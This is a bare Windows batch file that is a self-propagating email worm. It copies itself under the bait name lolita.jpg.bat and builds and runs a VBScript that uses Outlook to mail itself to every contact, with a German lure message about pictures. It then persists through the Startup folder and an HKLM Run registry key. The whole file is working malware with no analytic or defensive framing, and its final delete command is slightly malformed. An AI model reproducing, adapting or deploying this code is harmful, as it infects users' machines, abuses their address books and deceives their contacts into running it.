@echo off
ctty nul
copy %0 C:\oltme.vbs
copy %0 c:\lolita.jpg.bat
echo dim x >C:\oltme.vbs
echo.on error resume next >>C:\oltme.vbs
echo set fso="scripting.filesystem.object" >>C:\oltme.vbs
echo set so=createobject(fso) >>C:\oltme.vbs
echo set ol=createobject("outlook.application") >> C:\oltme.vbs
echo set out=wscript.createobject("outlook.application") >> C:\oltme.vbs
echo set mapi=out.Getnamespace("mapi") >>C:\oltme.vbs
echo set a=mapi.addresslists(1) >>C:\oltme.vbs
echo set ae=a.addressentries >> C:\oltme.vbs
echo for x=1 to ae.count >>C:\oltme.vbs
echo set mail=ol.createitem(0) >>C:\oltme.vbs
echo mail.to=ol.Getnamespace("mapi").addresslists(1).addressentries(x) >>C:\oltme.vbs
echo mail.subject="hi!wie gehts dir?">>C:\oltme.vbs
echo mail.Body="wow... hier sind die pictures die ich gerade gefunden hab... *fg*bye!!">>C:\oltme.vbs
echo mail.attachments.add("c:\lolita.jpg.bat") >>C:\oltme.vbs
echo mail.send >> C:\oltme.vbs
echo next >>C:\oltme.vbs
echo ol.Quit >>C:\oltme.vbs
cscript C:\oltme.vbs
del C:\oltme.vbs
copy %0 %windir%\startm~1\progra~1\autost~1
md %windir%\setman
copy %0 %windir%\setman\dtkei.bat
copy %0 C:\rtodq.vbs
echo.on error resume next>C:\rtodq.vbs
echo set ws=createobject("wscript.shell") >> C:\rtodq.vbs
echo ws.regwrite"HKLM\software\microsoft\windows\currentversion\run\ajklj","%windir%\Setman\dtkei.bat" >>C:\rtodq.vbs
cscript C:\rtodq.vbs
delC:\rtodq.vbs
